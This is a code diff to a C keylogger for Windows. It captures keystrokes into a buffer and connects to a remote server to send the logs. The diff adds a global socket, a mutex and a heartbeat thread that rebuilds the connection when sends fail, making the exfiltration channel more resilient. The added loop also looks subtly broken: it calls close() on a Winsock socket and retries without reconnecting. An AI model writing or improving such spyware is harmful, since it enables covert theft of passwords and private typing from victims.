@@ -10,11 +10,25 @@
 char BUFFER[BUF_SIZE] = {0};      // Main buffer to store captured keystrokes
 char TEMP_BUFFER[BUF_SIZE] = {0}; // Temporary buffer for sending logs
 
+SOCKET sock;
+HANDLE hMutex;
 
-
+DWORD WINAPI refresh_connection(LPVOID lpBuffer) {
+    WaitForSingleObject(hMutex, INFINITE);
+    loop_back:
+    int check = send(sock," {1} ", strlen(" {1} "), NULL);
+    if(check < 0) {
+        close(sock);
+        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        
+        goto loop_back;
+    }
+    ReleaseMutex(hMutex);
+    Sleep(4000);
+}
 DWORD WINAPI connect_to_server(LPVOID arg) {
     WSADATA wsaData;
-    SOCKET sock;
+    
     WSAStartup(MAKEWORD(2, 2), &wsaData);
     struct sockaddr_in server;
     sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
@@ -23,6 +37,7 @@ DWORD WINAPI connect_to_server(LPVOID arg) {
     server.sin_port = htons(SERVER_PORT);
 
     int conn = 1;
+    hMutex = CreateMutex(NULL, FALSE, NULL);
     while(1) {
         // Try to connect to the server
         conn = connect(sock, (struct sockaddr *)&server, sizeof(server));
@@ -68,7 +83,6 @@ int main() {
     int lastKeyState[256] = {0};    // Track last state of each key
     int logIndex = 0;               // Index for storing BUFFER
     HANDLE server_handle = CreateThread(NULL, 0, connect_to_server, NULL, 0, NULL);
-
     while (1) {
         for (int i = 0; i < 256; i++) {
             // Check if the key was just pressed (transition from not pressed to pressed)
